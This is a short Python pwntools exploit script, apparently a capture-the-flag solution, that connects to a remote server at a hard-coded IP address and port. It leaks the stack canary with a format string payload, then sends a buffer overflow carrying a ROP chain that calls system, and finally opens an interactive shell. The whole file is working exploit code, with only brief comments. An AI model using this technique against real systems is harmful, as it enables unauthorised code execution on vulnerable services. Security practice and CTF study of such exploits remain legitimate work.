#First import pwntools
from pwn import *

#Establish the remote connection
target = remote('146.185.132.36', 19153)

#Establish the address for the ROP chain
gadget0 = 0x400ab3
cat_adr = 0x400b30
sys_adr = 0x4006a0

#Recieve and print out the opening text
print target.recvuntil("Exit the battle")

#Execute the format string exploit to leak the stack canary
target.sendline("2")
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print "canary: " + hex(canary)
print target.recvuntil("Exit the battle")

#Put the Rop chain together, and send it to the server to exploit it
target.sendline("1")
payload = "0"*136 + p64(canary) + "1"*8 + p64(gadget0) + p64(cat_adr) + p64(sys_adr)
target.sendline(payload)

#Drop to an interactive shell
target.interactive()